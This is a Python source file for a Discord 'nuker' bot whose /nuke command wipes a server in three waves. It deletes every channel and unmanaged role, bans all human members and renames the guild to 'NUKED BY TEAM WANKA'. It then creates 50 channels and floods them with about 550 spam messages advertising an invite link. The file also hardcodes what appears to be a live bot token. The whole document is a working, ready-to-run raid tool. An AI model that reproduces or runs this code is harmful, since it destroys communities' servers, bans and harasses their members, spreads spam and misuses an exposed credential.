import asyncio
import discord
from discord.ext import commands
from discord import app_commands
import aiohttp

TOKEN= ""MTU2NjU2ODE0NDQ1MjA1OTM0Nw.G5Vlbv.IPLq0_z6nuMr33DhpaIM0DwT_A9fF8lPgZ7Dko""
BASE = "https://discord.com/api/v10"

SPAM_MESSAGE = "NUKED BY TEAM WANKA | discord.gg/Uqe2ba73ne"
GUILD_NAME = "NUKED BY TEAM WANKA"
CHANNEL_NAMES = ["raided-by-wankele", "nuked-by-wanka-team"]
CHANNEL_COUNT = 50
MESSAGES_PER_CHANNEL = 11  # 50 * 11 = 550 messages total

class Nuker(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = Nuker()

async def safe_delete(session, url, h):
    try: await session.delete(url, headers=h)
    except: pass

async def safe_put(session, url, h):
    try: await session.put(url, headers=h)
    except: pass

async def safe_patch(session, url, h, payload):
    try: await session.patch(url, headers=h, json=payload)
    except: pass

async def make_channel(session, guild_id, name, h):
    try:
        async with session.post(
            f"{BASE}/guilds/{guild_id}/channels",
            headers=h,
            json={"name": name, "type": 0}
        ) as r:
            data = await r.json()
            return data.get("id")
    except:
        return None

async def spam_channel(session, ch_id, h, count):
    for _ in range(count):
        try:
            await session.post(
                f"{BASE}/channels/{ch_id}/messages",
                headers=h,
                json={"content": SPAM_MESSAGE}
            )
        except:
            pass

@bot.tree.command(name="nuke", description="nuke this server")
@app_commands.checks.has_permissions(administrator=True)
async def nuke(interaction: discord.Interaction):
    guild = interaction.guild
    await interaction.response.send_message("💀", ephemeral=True)

    h = {
        "Authorization": f"Bot {TOKEN}",
        "Content-Type": "application/json"
    }

    async with aiohttp.ClientSession() as session:

        # --- wave 1: wipe everything simultaneously ---
        wave1 = []

        for ch in guild.channels:
            wave1.append(safe_delete(session, f"{BASE}/channels/{ch.id}", h))

        for role in guild.roles:
            if not role.managed and role.name != "@everyone":
                wave1.append(safe_delete(session, f"{BASE}/guilds/{guild.id}/roles/{role.id}", h))

        for member in guild.members:
            if not member.bot:
                wave1.append(safe_put(session, f"{BASE}/guilds/{guild.id}/bans/{member.id}", h))

        wave1.append(safe_patch(session, f"{BASE}/guilds/{guild.id}", h, {
            "name": GUILD_NAME,
            "icon": None
        }))

        await asyncio.gather(*wave1)

        # --- wave 2: create 50 spam channels ---
        channel_tasks = [
            make_channel(session, guild.id, CHANNEL_NAMES[i % len(CHANNEL_NAMES)], h)
            for i in range(CHANNEL_COUNT)
        ]
        created = await asyncio.gather(*channel_tasks)
        created_ids = [cid for cid in created if cid]

        # --- wave 3: blast 550+ messages across all channels ---
        wave3 = []
        for ch_id in created_ids:
            wave3.append(spam_channel(session, ch_id, h, MESSAGES_PER_CHANNEL))

        await asyncio.gather(*wave3)

bot.run(TOKEN)
